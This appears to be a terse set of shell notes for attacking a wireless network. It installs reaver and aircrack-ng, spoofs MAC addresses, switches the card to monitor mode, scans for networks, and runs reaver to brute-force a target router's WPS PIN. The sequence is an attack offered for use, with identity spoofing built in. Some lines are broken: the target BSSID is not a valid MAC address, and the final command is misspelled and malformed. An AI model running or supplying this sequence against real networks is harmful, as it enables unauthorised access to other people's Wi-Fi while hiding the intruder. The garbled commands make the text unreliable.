apt-get install macchanger

apt-get install aircrack-ng

apt-get install reaver

ifconfig wlan0 down

macchanger -m 00:11:22:33:44:55 wlan0

ifconfig wlan0 up 

airmon-ng start wlan0

ifconfig mon0 down

macchanger -m 00:11:22:33:44:55 mon0

ifconfig mon0 up

airodump-ng mon0 

reaver -i mon0 -b 1c:92:16:h8:154:53 -vv -dh-small  





ifconfig en1 | grep ether

 arp -a
  
 sudo en1 ether ifcongig d2:b3:3f:7d:95:b0





